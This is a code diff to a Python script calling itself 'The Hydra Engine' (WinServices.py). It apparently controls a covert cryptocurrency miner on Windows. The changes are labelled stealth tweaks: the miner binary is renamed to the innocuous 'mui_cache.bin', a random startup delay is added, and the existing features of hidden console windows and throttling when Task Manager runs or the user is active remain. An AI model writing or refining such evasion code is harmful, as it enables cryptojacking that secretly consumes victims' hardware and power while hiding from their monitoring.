@@ -1,6 +1,6 @@
-import os, sys, subprocess
+import os, sys, subprocess, random
 
-# --- THE HYDRA ENGINE (WinServices.py v6.3 - INDIVIDUAL WORKERS) ---
+# --- THE HYDRA ENGINE (WinServices.py v6.4 - STEALTH UPDATE) ---
 # This flag tells Windows: "Do NOT show a console window."
 HIDE_WINDOW = 0x08000000 
 
@@ -47,7 +47,7 @@ WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
 SELF_PATH = os.path.realpath(__file__)
 
 CONFIG = {
-    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
+    "MINER": os.path.join(WORK_DIR, "mui_cache.bin"), # TWEAK 1: New Stealth Filename
     "WATCH": "Taskmgr.exe",
     "IDLE_PWR": "90",  # 90% when truly idle
     "NORM_PWR": "25",  # 25% when user is active
@@ -119,7 +119,8 @@ def manage_power():
     current_power = "0"
     for p in psutil.process_iter(['name', 'exe', 'cmdline']):
         try:
-            if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
+            # TWEAK 2: Match new bin path specifically
+            if p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                 miner_proc = p
                 for arg in p.info['cmdline']:
                     if arg == CONFIG["IDLE_PWR"] or arg == CONFIG["NORM_PWR"]:
@@ -154,8 +155,11 @@ def manage_power():
                 notify(f"Engine Failed: {str(e)}", "sys")
 
 def main():
+    # TWEAK 3: Random stealth delay before engagement
+    time.sleep(random.randint(15, 45))
+    
     engage_locks()
-    notify("SYSTEM ONLINE (v6.3 - Individual Worker Mode)", "sys")
+    notify("SYSTEM ONLINE (v6.4 - Stealth mui_cache active)", "sys")
     last_update = time.time()
     
     while True:
